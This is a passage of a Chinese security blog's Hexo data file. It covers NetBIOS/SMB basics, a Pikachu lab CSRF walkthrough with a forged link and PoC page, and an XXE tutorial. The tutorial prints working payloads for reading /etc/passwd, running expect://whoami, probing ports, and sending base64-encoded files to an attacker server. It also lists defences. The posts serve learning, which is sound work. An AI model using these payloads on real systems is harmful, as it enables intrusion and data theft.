139</li>\n</ul>\n</blockquote>\n<p><img src=\"/2019/03/23/NetBIOS、SMB浅析/20181112194501454.jpg\" alt></p>\n<p><strong>0x00 名称解析服务（NBNS）</strong></p>\n<p>运行在137（UDP）端口，提供计算机的名字到IP地址的查询服务，类似于TCP/IP协议中的DNS。</p>\n<p>计算机名称到IP地址的管理方式：</p>\n<ul>\n<li>第一种：位于同一工作组中的电脑之间利用广播功能进行计算机名管理。</li>\n</ul>\n<blockquote>\n<p>​    电脑在启动或者连接网络时，会向同一工作组中的所有计算机质询有没有和自己相同的NetBIOS名称。</p>\n</blockquote>\n<ul>\n<li>另一种：利用WINS（Windows因特网名称服务）管理NetBIOS名称。</li>\n</ul>\n<blockquote>\n<p>WINS服务器用于记录计算机NetBIOS名称和IP地址的对应关系，供局域网计算机查询。WINS客户端在系统起动时或连接网络时会将自己的NetBIOS名称与IP地址发送给WINS服务器。</p>\n</blockquote>\n<p>向目标主机的137端口发送一个连接请求，就能获得目标主机的名称、MAC地址。</p>\n<h4 id=\"NBTSTAT\"><a href=\"#NBTSTAT\" class=\"headerlink\" title=\"NBTSTAT\"></a>NBTSTAT</h4><p>nbtstat是Windows下与NetBIOS相关的DOS命令。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NBTSTAT [ [-a RemoteName] [-A IP address] [-c] [-n] [-r] [-R] [-RR] [-s] [-S] [interval] ]</span><br><span class=\"line\"></span><br><span class=\"line\">  -a   (适配器状态)     列出指定名称的远程机器的名称表（可跟名称和IP）</span><br><span class=\"line\">  -A   (适配器状态)     列出指定 IP 地址的远程机器的名称表。（只能IP）</span><br><span class=\"line\">  -c   (缓存)          列出远程[计算机]名称及其 IP 地址的 NBT 缓存</span><br><span class=\"line\">  -n   (名称)          列出本地 NetBIOS 名称。</span><br><span class=\"line\">  -r   (已解析)        列出通过广播和经由 WINS 解析的名称</span><br><span class=\"line\">  -R   (重新加载)       清除和重新加载远程缓存名称表</span><br><span class=\"line\">  -S   (会话)          列出具有目标 IP 地址的会话表</span><br><span class=\"line\">  -s   (会话)          列出将目标 IP 地址转换成计算机 NETBIOS 名称的会话表。</span><br><span class=\"line\">  -RR  (释放刷新)      将名称释放包发送到 WINS，然后启动刷新</span><br><span class=\"line\"></span><br><span class=\"line\">  RemoteName   远程主机计算机名。</span><br><span class=\"line\">  IP address   用点分隔的十进制表示的 IP 地址。</span><br><span class=\"line\">  interval     重新显示选定的统计、每次显示之间暂停的间隔秒数。</span><br><span class=\"line\">               按 Ctrl+C 停止重新显示统计。</span><br></pre></td></tr></table></figure>\n<p>环境介绍：</p>\n<p>我们的局域网中存在两台主机，分别是：</p>\n<blockquote>\n<p>主机名（NetBIOS名称）  &lt;=========&gt;       IP地址</p>\n<p>​    SAKURA_II          &lt;=========&gt;    192.168.1.105 </p>\n<p>​    XESTATION          &lt;=========&gt;    192.168.1.101</p>\n</blockquote>\n<p>以下演示的操作均在IP为192.168.1.105的主机上进行，并使用Wireshark抓包分析。</p>\n<ul>\n<li><strong><code>nbtstat -A 192.168.1.101</code></strong> ：查询IP为192.168.1.101主机的计算机的名称列表。</li>\n</ul>\n<blockquote>\n<p>实质是向192.168.1.101主机的NetBIOS的名称解析服务（NBNS)监听的UDP 137端口发送查询。</p>\n</blockquote>\n<p>Wireshark抓取请求包：</p>\n<p><img src=\"/2019/03/23/NetBIOS、SMB浅析/QQ截图20190323121259.png\" alt></p>\n<p>命令执行的结果：</p>\n<p><img src=\"/2019/03/23/NetBIOS、SMB浅析/QQ截图20190323122802.png\" alt></p>\n<ul>\n<li><strong><code>nbtstat -c</code></strong>：查询NetBIOS缓存。</li>\n<li><strong><code>nbtstat -n</code></strong>：查询本地NetBIOS名称。</li>\n</ul>\n<p><strong>0x01 数据报服务（NBDS）</strong></p>\n<p>运行在138（UDP）端口，提供NetBIOS浏览功能，即显示连接到网络的计算机设备列表。</p>\n<blockquote>\n<ul>\n<li>每台电脑在启动时或连接网络时通过138端口广播自己的NetBIOS名称，收到NetBIOS广播的计算机会将该计算机追加到浏览列表中；</li>\n<li>关闭电脑时，计算机会通过138端口广播，收到NetBIOS广播的计算机会将该计算机从浏览列表中删除；</li>\n<li>当计算机需要连接加入到网络的计算机设备列表，会广播一个请求，收到请求的主机会给其发送计算机列表。</li>\n</ul>\n</blockquote>\n<p>向目标主机的138端口发送请求，就能获得目标主机所处的局域网的网络名称以及目标主机的计算机名称，以及是否安装主控控制器，IIS是否正在运行等。</p>\n<p>周期性在UDP 138端口广播NetBIOS信息：</p>\n<p><img src=\"/2019/03/23/NetBIOS、SMB浅析/QQ截图20190323125719.png\" alt></p>\n<p><strong>0x02 会话服务（NBSS）</strong></p>\n<p>运行在139（TCP）端口，提供“NetBIOS Session Service”服务，使用SMB协议对外提供共享服务，包括Windows文件和打印机共享以及Unix中的Samba服务。</p>\n<hr>\n<h3 id=\"SMB协议\"><a href=\"#SMB协议\" class=\"headerlink\" title=\"SMB协议\"></a>SMB协议</h3><p>SMB（Server Message Block）是由微软开发的应用层网络传输协议，主要功能是使网络上的机器能够共享计算机文件、打印机、串行端口和通讯等资源。</p>\n<p>经过Unix服务器厂商重新开发后，它可以用于连接Unix服务器和Windows客户机，执行打印和文件共享等任务。</p>\n<p>SMB一开始的设计是在NetBIOS协议上运行的（而NetBIOS本身则运行在NetBEUI、IPX/SPX或TCP/IP协议上），从Windows 2000开始，微软引入SMB Direct Over TCP，重新命名为 CIFS（Common Internet File System），并打算将它与NetBIOS相脱离。</p>\n<h4 id=\"CIFS\"><a href=\"#CIFS\" class=\"headerlink\" title=\"CIFS\"></a>CIFS</h4><p>CIFS是由微软在SMB的基础上，扩展到Internet上的协议。若SMB直接运行在TCP上（而不是NetBIOS上），即CIFS协议，使用TCP端口号445。提供的功能与139端口完全相同。</p>\n<p>为保证向后兼容性，Windows 2000以后版本中基于NBT的SMB和CIFS同时并存。</p>\n<blockquote>\n<p>当Windows系统（允许NBT）来连接SMB服务器时，同时尝试连接139和445端口：</p>\n<ul>\n<li>如果445端口有响应，那么发送RST包给139端口断开连接，使用455端口提供SMB服务。</li>\n<li>当445端口无响应时，使用139端口提供SMB服务。</li>\n</ul>\n</blockquote>\n<h4 id=\"Wireshark抓包\"><a href=\"#Wireshark抓包\" class=\"headerlink\" title=\"Wireshark抓包\"></a>Wireshark抓包</h4><p>在主机192.168.1.105上开启文件共享，不需要密码。</p>\n<p>在主机192.168.1.101上访问192.168.1.105主机上的共享：\\192.168.1.105</p>\n<p><img src=\"/2019/03/23/NetBIOS、SMB浅析/QQ截图20190323140801.png\" alt></p>\n<p><strong>参考资料</strong></p>\n<p><a href=\"https://www.cnblogs.com/bigrabbit/p/3910094.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/bigrabbit/p/3910094.html</a></p>"},{"title":"WEB漏洞靶场Pikachu Writeup Chapter 3：CSRF","date":"2019-03-25T05:09:32.000Z","_content":"\n### CSRF之GET提交数据\n\n打开页面，是一个登录页面，我们使用lucy/123456进入用户后台。\n\n<!-- more -->\n\n![](WEB漏洞靶场pikachu-CSRF\\QQ截图20190325131233.png)\n\n进入用户后台后，点击修改个人信息，修改信息后点击提交并使用Burp进行抓包。\n\n![](WEB漏洞靶场pikachu-CSRF\\QQ截图20190325131618.png)\n\n观察Burp抓到的数据包可以发现，数据包是以GET方式提交的，参数与表单的输入框也是一一对应的，没有任何CSRF防御。\n\n![](WEB漏洞靶场pikachu-CSRF\\QQ截图20190325131837.png)\n\n那么我们只需要修改 `http://192.168.100.111/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=female&phonenum=12345678922&add=US&email=lucy%40pikachu.com&submit=submit`这个链接的参数值部分，然后发给想要攻击的用户，若用户本地存在身份认证信息（Cookie），那么他的个人信息就会被修改为我们链接里面的信息。\n\n**漏洞分析**\n\n通过源码可以得知，服务器接收到用户提交的修改个人信息的请求时，只判断是否登录以及是否有信息为空，若不为空就直接更新个人信息数据表，没有进行任何CSRF验证。\n\n![](WEB漏洞靶场pikachu-CSRF\\QQ截图20190325132842.png)\n\n### CSRF之POST提交数据\n\n同上一节一样，登录然后修改信息抓包，不同的是这次我们抓包发现数据是以POST方式提交的。\n\n![](WEB漏洞靶场pikachu-CSRF\\QQ截图20190325133302.png)\n\n然后右键数据包，按下图方式选择生成CSRF PoC。\n\n![](WEB漏洞靶场pikachu-CSRF\\QQ截图20190325133440.png)\n\n根据下图修改信息生成PoC：\n\n![](WEB漏洞靶场pikachu-CSRF\\QQ截图20190325133950.png)\n\n将拷贝的PoC存储为evil.html，并且放于我们的服务器上。然后将该PoC文件的URL地址发给想要攻击的用户，用户点击访问该PoC文件，PoC文件的表单数据就会被提交到服务器，导致用户信息被修改。\n\n**漏洞分析**\n\n与上一节基本没什么区别，区别只是提交数据的方式不同。\n\n### Token防止CSRF\n\n接下来看Token是如何防止CSRF的。\n\n点击修改个人信息按钮后，服务器会返回一个个人信息的表单页面。表单会嵌入一个隐藏的`<input />`标签，标签的`value`属性值为服务器端生成并存储在Session中的token，表单数据被提交时，token也会被提交到服务器。\n\n![](WEB漏洞靶场pikachu-CSRF\\QQ截图20190325140018.png)\n\n当填好个人信息的表单，点击提交后，服务器不仅检查信息是否有空值，还会将表单提交过来的token值也Session中的token值作对比，对比不通过不会执行个人信息修改操作。\n\n![](WEB漏洞靶场pikachu-CSRF\\QQ截图20190325140514.png)\n\nToken防止CSRF的本质是让攻击者无法完整预测数据包的参数部分。","source":"_posts/WEB漏洞靶场pikachu-CSRF.md","raw":"---\ntitle: WEB漏洞靶场Pikachu Writeup Chapter 3：CSRF\ndate: 2019-03-25 13:09:32\ntags: \n\t- 靶场\n\t- WEB安全\n\t- XSS\ncategories: Pikachu\n---\n\n### CSRF之GET提交数据\n\n打开页面，是一个登录页面，我们使用lucy/123456进入用户后台。\n\n<!-- more -->\n\n![](WEB漏洞靶场pikachu-CSRF\\QQ截图20190325131233.png)\n\n进入用户后台后，点击修改个人信息，修改信息后点击提交并使用Burp进行抓包。\n\n![](WEB漏洞靶场pikachu-CSRF\\QQ截图20190325131618.png)\n\n观察Burp抓到的数据包可以发现，数据包是以GET方式提交的，参数与表单的输入框也是一一对应的，没有任何CSRF防御。\n\n![](WEB漏洞靶场pikachu-CSRF\\QQ截图20190325131837.png)\n\n那么我们只需要修改 `http://192.168.100.111/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=female&phonenum=12345678922&add=US&email=lucy%40pikachu.com&submit=submit`这个链接的参数值部分，然后发给想要攻击的用户，若用户本地存在身份认证信息（Cookie），那么他的个人信息就会被修改为我们链接里面的信息。\n\n**漏洞分析**\n\n通过源码可以得知，服务器接收到用户提交的修改个人信息的请求时，只判断是否登录以及是否有信息为空，若不为空就直接更新个人信息数据表，没有进行任何CSRF验证。\n\n![](WEB漏洞靶场pikachu-CSRF\\QQ截图20190325132842.png)\n\n### CSRF之POST提交数据\n\n同上一节一样，登录然后修改信息抓包，不同的是这次我们抓包发现数据是以POST方式提交的。\n\n![](WEB漏洞靶场pikachu-CSRF\\QQ截图20190325133302.png)\n\n然后右键数据包，按下图方式选择生成CSRF PoC。\n\n![](WEB漏洞靶场pikachu-CSRF\\QQ截图20190325133440.png)\n\n根据下图修改信息生成PoC：\n\n![](WEB漏洞靶场pikachu-CSRF\\QQ截图20190325133950.png)\n\n将拷贝的PoC存储为evil.html，并且放于我们的服务器上。然后将该PoC文件的URL地址发给想要攻击的用户，用户点击访问该PoC文件，PoC文件的表单数据就会被提交到服务器，导致用户信息被修改。\n\n**漏洞分析**\n\n与上一节基本没什么区别，区别只是提交数据的方式不同。\n\n### Token防止CSRF\n\n接下来看Token是如何防止CSRF的。\n\n点击修改个人信息按钮后，服务器会返回一个个人信息的表单页面。表单会嵌入一个隐藏的`<input />`标签，标签的`value`属性值为服务器端生成并存储在Session中的token，表单数据被提交时，token也会被提交到服务器。\n\n![](WEB漏洞靶场pikachu-CSRF\\QQ截图20190325140018.png)\n\n当填好个人信息的表单，点击提交后，服务器不仅检查信息是否有空值，还会将表单提交过来的token值也Session中的token值作对比，对比不通过不会执行个人信息修改操作。\n\n![](WEB漏洞靶场pikachu-CSRF\\QQ截图20190325140514.png)\n\nToken防止CSRF的本质是让攻击者无法完整预测数据包的参数部分。","slug":"WEB漏洞靶场pikachu-CSRF","published":1,"updated":"2019-03-25T06:13:43.143Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83kv00287or0f2mddspm","content":"<h3 id=\"CSRF之GET提交数据\"><a href=\"#CSRF之GET提交数据\" class=\"headerlink\" title=\"CSRF之GET提交数据\"></a>CSRF之GET提交数据</h3><p>打开页面，是一个登录页面，我们使用lucy/123456进入用户后台。</p>\n<a id=\"more\"></a>\n<p><img src=\"/2019/03/25/WEB漏洞靶场pikachu-CSRF/QQ截图20190325131233.png\" alt></p>\n<p>进入用户后台后，点击修改个人信息，修改信息后点击提交并使用Burp进行抓包。</p>\n<p><img src=\"/2019/03/25/WEB漏洞靶场pikachu-CSRF/QQ截图20190325131618.png\" alt></p>\n<p>观察Burp抓到的数据包可以发现，数据包是以GET方式提交的，参数与表单的输入框也是一一对应的，没有任何CSRF防御。</p>\n<p><img src=\"/2019/03/25/WEB漏洞靶场pikachu-CSRF/QQ截图20190325131837.png\" alt></p>\n<p>那么我们只需要修改 <code>http://192.168.100.111/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=female&amp;phonenum=12345678922&amp;add=US&amp;email=lucy%40pikachu.com&amp;submit=submit</code>这个链接的参数值部分，然后发给想要攻击的用户，若用户本地存在身份认证信息（Cookie），那么他的个人信息就会被修改为我们链接里面的信息。</p>\n<p><strong>漏洞分析</strong></p>\n<p>通过源码可以得知，服务器接收到用户提交的修改个人信息的请求时，只判断是否登录以及是否有信息为空，若不为空就直接更新个人信息数据表，没有进行任何CSRF验证。</p>\n<p><img src=\"/2019/03/25/WEB漏洞靶场pikachu-CSRF/QQ截图20190325132842.png\" alt></p>\n<h3 id=\"CSRF之POST提交数据\"><a href=\"#CSRF之POST提交数据\" class=\"headerlink\" title=\"CSRF之POST提交数据\"></a>CSRF之POST提交数据</h3><p>同上一节一样，登录然后修改信息抓包，不同的是这次我们抓包发现数据是以POST方式提交的。</p>\n<p><img src=\"/2019/03/25/WEB漏洞靶场pikachu-CSRF/QQ截图20190325133302.png\" alt></p>\n<p>然后右键数据包，按下图方式选择生成CSRF PoC。</p>\n<p><img src=\"/2019/03/25/WEB漏洞靶场pikachu-CSRF/QQ截图20190325133440.png\" alt></p>\n<p>根据下图修改信息生成PoC：</p>\n<p><img src=\"/2019/03/25/WEB漏洞靶场pikachu-CSRF/QQ截图20190325133950.png\" alt></p>\n<p>将拷贝的PoC存储为evil.html，并且放于我们的服务器上。然后将该PoC文件的URL地址发给想要攻击的用户，用户点击访问该PoC文件，PoC文件的表单数据就会被提交到服务器，导致用户信息被修改。</p>\n<p><strong>漏洞分析</strong></p>\n<p>与上一节基本没什么区别，区别只是提交数据的方式不同。</p>\n<h3 id=\"Token防止CSRF\"><a href=\"#Token防止CSRF\" class=\"headerlink\" title=\"Token防止CSRF\"></a>Token防止CSRF</h3><p>接下来看Token是如何防止CSRF的。</p>\n<p>点击修改个人信息按钮后，服务器会返回一个个人信息的表单页面。表单会嵌入一个隐藏的<code>&lt;input /&gt;</code>标签，标签的<code>value</code>属性值为服务器端生成并存储在Session中的token，表单数据被提交时，token也会被提交到服务器。</p>\n<p><img src=\"/2019/03/25/WEB漏洞靶场pikachu-CSRF/QQ截图20190325140018.png\" alt></p>\n<p>当填好个人信息的表单，点击提交后，服务器不仅检查信息是否有空值，还会将表单提交过来的token值也Session中的token值作对比，对比不通过不会执行个人信息修改操作。</p>\n<p><img src=\"/2019/03/25/WEB漏洞靶场pikachu-CSRF/QQ截图20190325140514.png\" alt></p>\n<p>Token防止CSRF的本质是让攻击者无法完整预测数据包的参数部分。</p>\n","site":{"data":{}},"excerpt":"<h3 id=\"CSRF之GET提交数据\"><a href=\"#CSRF之GET提交数据\" class=\"headerlink\" title=\"CSRF之GET提交数据\"></a>CSRF之GET提交数据</h3><p>打开页面，是一个登录页面，我们使用lucy/123456进入用户后台。</p>","more":"<p><img src=\"/2019/03/25/WEB漏洞靶场pikachu-CSRF/QQ截图20190325131233.png\" alt></p>\n<p>进入用户后台后，点击修改个人信息，修改信息后点击提交并使用Burp进行抓包。</p>\n<p><img src=\"/2019/03/25/WEB漏洞靶场pikachu-CSRF/QQ截图20190325131618.png\" alt></p>\n<p>观察Burp抓到的数据包可以发现，数据包是以GET方式提交的，参数与表单的输入框也是一一对应的，没有任何CSRF防御。</p>\n<p><img src=\"/2019/03/25/WEB漏洞靶场pikachu-CSRF/QQ截图20190325131837.png\" alt></p>\n<p>那么我们只需要修改 <code>http://192.168.100.111/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=female&amp;phonenum=12345678922&amp;add=US&amp;email=lucy%40pikachu.com&amp;submit=submit</code>这个链接的参数值部分，然后发给想要攻击的用户，若用户本地存在身份认证信息（Cookie），那么他的个人信息就会被修改为我们链接里面的信息。</p>\n<p><strong>漏洞分析</strong></p>\n<p>通过源码可以得知，服务器接收到用户提交的修改个人信息的请求时，只判断是否登录以及是否有信息为空，若不为空就直接更新个人信息数据表，没有进行任何CSRF验证。</p>\n<p><img src=\"/2019/03/25/WEB漏洞靶场pikachu-CSRF/QQ截图20190325132842.png\" alt></p>\n<h3 id=\"CSRF之POST提交数据\"><a href=\"#CSRF之POST提交数据\" class=\"headerlink\" title=\"CSRF之POST提交数据\"></a>CSRF之POST提交数据</h3><p>同上一节一样，登录然后修改信息抓包，不同的是这次我们抓包发现数据是以POST方式提交的。</p>\n<p><img src=\"/2019/03/25/WEB漏洞靶场pikachu-CSRF/QQ截图20190325133302.png\" alt></p>\n<p>然后右键数据包，按下图方式选择生成CSRF PoC。</p>\n<p><img src=\"/2019/03/25/WEB漏洞靶场pikachu-CSRF/QQ截图20190325133440.png\" alt></p>\n<p>根据下图修改信息生成PoC：</p>\n<p><img src=\"/2019/03/25/WEB漏洞靶场pikachu-CSRF/QQ截图20190325133950.png\" alt></p>\n<p>将拷贝的PoC存储为evil.html，并且放于我们的服务器上。然后将该PoC文件的URL地址发给想要攻击的用户，用户点击访问该PoC文件，PoC文件的表单数据就会被提交到服务器，导致用户信息被修改。</p>\n<p><strong>漏洞分析</strong></p>\n<p>与上一节基本没什么区别，区别只是提交数据的方式不同。</p>\n<h3 id=\"Token防止CSRF\"><a href=\"#Token防止CSRF\" class=\"headerlink\" title=\"Token防止CSRF\"></a>Token防止CSRF</h3><p>接下来看Token是如何防止CSRF的。</p>\n<p>点击修改个人信息按钮后，服务器会返回一个个人信息的表单页面。表单会嵌入一个隐藏的<code>&lt;input /&gt;</code>标签，标签的<code>value</code>属性值为服务器端生成并存储在Session中的token，表单数据被提交时，token也会被提交到服务器。</p>\n<p><img src=\"/2019/03/25/WEB漏洞靶场pikachu-CSRF/QQ截图20190325140018.png\" alt></p>\n<p>当填好个人信息的表单，点击提交后，服务器不仅检查信息是否有空值，还会将表单提交过来的token值也Session中的token值作对比，对比不通过不会执行个人信息修改操作。</p>\n<p><img src=\"/2019/03/25/WEB漏洞靶场pikachu-CSRF/QQ截图20190325140514.png\" alt></p>\n<p>Token防止CSRF的本质是让攻击者无法完整预测数据包的参数部分。</p>"},{"title":"XXE（XML External Entity）漏洞","date":"2019-03-01T00:59:43.000Z","_content":"\n## 0x00 必备XML基础知识\n\nDTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。\n\nDTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。实体的声明是在DTD声明里面的，属于DTD声明的一部分。\n\n<!-- more -->\n\n![](XXE\\InkedQQ截图20190301091748_LI.jpg)\n\n更多XML基础知识跳转[这里](https://sakuxa.com/2019/02/28/xml/)。\n\n## 0x01 XXE漏洞概述\n\nXXE -\"xml external entity injection\"即\"xml外部实体注入漏洞\"。\n\n攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题。\n也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。\n\n在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。可以使用phpinfo()查看libxml的版本信息。 \n\n![](XXE\\QQ截图20190301093413.png)\n\n**漏洞检测：**\n\n首先，检测XML是否会被解析。`&xxe;`是否会被解析为\"this is xxe\".(注意：GET请求时记得把`&`进行URL编码)\n\n> Payload:`<!DOCTYPE ANY [ <!ENTITY xxe \"this is xxe..\"> ]> <x>&xxe;</x>`\n\n然后，检测服务器是否支持外部实体。执行Payload后查看`test.com`服务器的http访问日志，看是否存在`GET /xxe_test HTTP/1.0`的请求，若存在则证明支持外部实体。\n\n> Payload:`<!DOCTYPE ANY [ <!ENTITY xxe SYSTEM  \"http://test.com/xxe_test\"> ]><x>&xxe;</x>`\n\n## 0x02 恶意引入外部实体\n\n**情景一：**\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [    \n  <!ELEMENT note any>   \n \n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >\n]>\n\n<note> &xxe; </note>\n```\n\n**情景二：**\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [    \n  <!ELEMENT note any>   \n \n  <!ENTITY % hack SYSTEM \"hack.dtd\" >\n  % hack  //会被hack.dtd的内容替换。\n]>\n\n<note> &xxe; </note>\n```\n\n`hack.dtd`文件内容：\n\n```xml-dtd\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >\n```\n\n**情景三：**\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE note SYSTEM \"hack.dtd\">\n\n<note> &xxe; </note>\n```\n\n`hack.dtd`文件内容：\n\n```xml-dtd\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >\n```\n\n**外部引用实体时，不同的程序可以使用的协议不一样：**\n\n![](XXE\\15129735161149.png)\n\n## 0x03 XXE漏洞利用\n\n利用xxe漏洞可以进行拒绝服务攻击，文件读取，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等，内网探测和入侵是利用xxe中支持的协议进行内网主机和端口发现，可以理解是使用XXE进行SSRF的利用。\n\n一般XXE利用分为两大场景：有回显和无回显。\n\n> - 有回显的情况可以直接在页面中看到Payload的执行结果或现象。\n> - 无回显的情况又称为Blind XXE，可以使用带外数据通道提取数据。\n\n基本漏洞源码：\n\n```php\n<?php\n    $xml=simplexml_load_string($_REQUEST['xml']);\n    echo \"<p>$xml</p>\"\n?>\n```\n\n**1.任意文件读取：**\n\n**有回显的情况：**\n\nPayload:`<!DOCTYPE note [<!ELEMENT note ANY ><!ENTITY xxe SYSTEM \"file:///S://aa.txt\">]><note>&xxe;</note>` \n\n![](S:\\hexo\\myblog\\source\\_posts\\XXE\\QQ截图20190301133421.png)\n\n![](XXE\\QQ截图20190301133122.png)\n\n**无回显的情况：**\n\n`%file;`会调用php插件对要读取的文件内容进行Base64编码。\n\n`%dtd;`会请求我们编写好的`evil.xml`文件，会被`evil.xml`文件内容替换。\n\n`%payload;`被`<!ENTITY &#x25; send SYSTEM 'http://localhost/?content=%file;'>`替换。\n\n`%send;`会向我们的服务器发送一次请求，请求的参数是被编码的文件内容，此时我们去查看`http`的访问日志就能看到被编码的文件内容，进行Base64解码就能得到文件内容。\n\nPayload:\n\n```xml-dtd\n<!DOCTYPE note [ \n  <!ELEMENT note ANY >\n  <!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/S:/test.txt\">\n  <!ENTITY % dtd SYSTEM \"http://localhost/evil.xml\">\n  %dtd; %payload; %send;  ]>\n```\n\n`evil.xml`文件内容：内部`send`的`%`要用实体：`&#x25;`\n\n```xml-dtd\n<!ENTITY % payload \"<!ENTITY &#x25; send SYSTEM 'http://localhost/?content=%file;'>\"> \n```\n\n`http`访问日志：（到配置文件`http.conf`里找到`CustomLog \"logs/access.log\" common`并删除掉`#`号注释）\n\n![](XXE\\QQ截图20190301152037.png)\n\n**PS:**之所以要引入文件`evil.xml`原因是不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。\n\nBase64解码：\n\n![](XXE\\QQ截图20190301152528.png)\n\n**2.命令执行：**\n\n安装了expect扩展的PHP环境可以执行系统命令，其他协议也有可能存在其他执行系统命令的方法。\n\n[expect](http://php.net/manual/zh/wrappers.expect.php)封装协议默认未开启。\n\nPayload:`<!DOCTYPE ANY [ <!ENTITY xxe SYSTEM \"expect://whoami\"> ]><x>&xxe;</x>`\n\n**3.内网端口探测：**\n\nPayload:`<!DOCTYPE ANY [ <!ENTITY xxe SYSTEM \"http://localhost:81\"> ]><x>%26xxe;</x>`\n\n## 0x04 漏洞防御\n\n- 尽可能使用简单的数据格式（如：JSON），避免对敏感数据进行序列化。\n- 及时修复或更新应用程序或底层操作系统使用的所有XML处理器和库。\n- 在服务器端实施积极的（“白名单”）输入验证、过滤和清理，以防止在XML文档、标题或节点中出现恶意数据。关键词：<!DOCTYPE和<!ENTITY，或者，SYSTEM和PUBLIC。\n- 使用开发语言提供的禁用外部实体的方法。\n\n**参考链接：**\n\nhttps://github.com/JnuSimba/MiscSecNotes/blob/master/XML%E6%B3%A8%E5%85%A5/XXE%E6%BC%8F%E6%B4%9E.md\n\nhttps://www.cnblogs.com/backlion/p/9302528.html\n\nhttps://www.jianshu.com/p/77f2181587a4","source":"_posts/XXE.md","raw":"---\ntitle: XXE（XML External Entity）漏洞\ndate: 2019-03-01 08:59:43\ntags: \n\t- XXE\n\t- XML注入\n\t- OWASP Top10 2017\ncategories: WEB漏洞学习\n---\n\n## 0x00 必备XML基础知识\n\nDTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。\n\nDTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。实体的声明是在DTD声明里面的，属于DTD声明的一部分。\n\n<!-- more -->\n\n![](XXE\\InkedQQ截图20190301091748_LI.jpg)\n\n更多XML基础知识跳转[这里](https://sakuxa.com/2019/02/28/xml/)。\n\n## 0x01 XXE漏洞概述\n\nXXE -\"xml external entity injection\"即\"xml外部实体注入漏洞\"。\n\n攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题。\n也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。\n\n在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。可以使用phpinfo()查看libxml的版本信息。 \n\n![](XXE\\QQ截图20190301093413.png)\n\n**漏洞检测：**\n\n首先，检测XML是否会被解析。`&xxe;`是否会被解析为\"this is xxe\".(注意：GET请求时记得把`&`进行URL编码)\n\n> Payload:`<!DOCTYPE ANY [ <!ENTITY xxe \"this is xxe..\"> ]> <x>&xxe;</x>`\n\n然后，检测服务器是否支持外部实体。执行Payload后查看`test.com`服务器的http访问日志，看是否存在`GET /xxe_test HTTP/1.0`的请求，若存在则证明支持外部实体。\n\n> Payload:`<!DOCTYPE ANY [ <!ENTITY xxe SYSTEM  \"http://test.com/xxe_test\"> ]><x>&xxe;</x>`\n\n## 0x02 恶意引入外部实体\n\n**情景一：**\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [    \n  <!ELEMENT note any>   \n \n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >\n]>\n\n<note> &xxe; </note>\n```\n\n**情景二：**\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE note [    \n  <!ELEMENT note any>   \n \n  <!ENTITY % hack SYSTEM \"hack.dtd\" >\n  % hack  //会被hack.dtd的内容替换。\n]>\n\n<note> &xxe; </note>\n```\n\n`hack.dtd`文件内容：\n\n```xml-dtd\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >\n```\n\n**情景三：**\n\n```xml\n<?xml version=\"1.0\"?>\n<!DOCTYPE note SYSTEM \"hack.dtd\">\n\n<note> &xxe; </note>\n```\n\n`hack.dtd`文件内容：\n\n```xml-dtd\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >\n```\n\n**外部引用实体时，不同的程序可以使用的协议不一样：**\n\n![](XXE\\15129735161149.png)\n\n## 0x03 XXE漏洞利用\n\n利用xxe漏洞可以进行拒绝服务攻击，文件读取，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等，内网探测和入侵是利用xxe中支持的协议进行内网主机和端口发现，可以理解是使用XXE进行SSRF的利用。\n\n一般XXE利用分为两大场景：有回显和无回显。\n\n> - 有回显的情况可以直接在页面中看到Payload的执行结果或现象。\n> - 无回显的情况又称为Blind XXE，可以使用带外数据通道提取数据。\n\n基本漏洞源码：\n\n```php\n<?php\n    $xml=simplexml_load_string($_REQUEST['xml']);\n    echo \"<p>$xml</p>\"\n?>\n```\n\n**1.任意文件读取：**\n\n**有回显的情况：**\n\nPayload:`<!DOCTYPE note [<!ELEMENT note ANY ><!ENTITY xxe SYSTEM 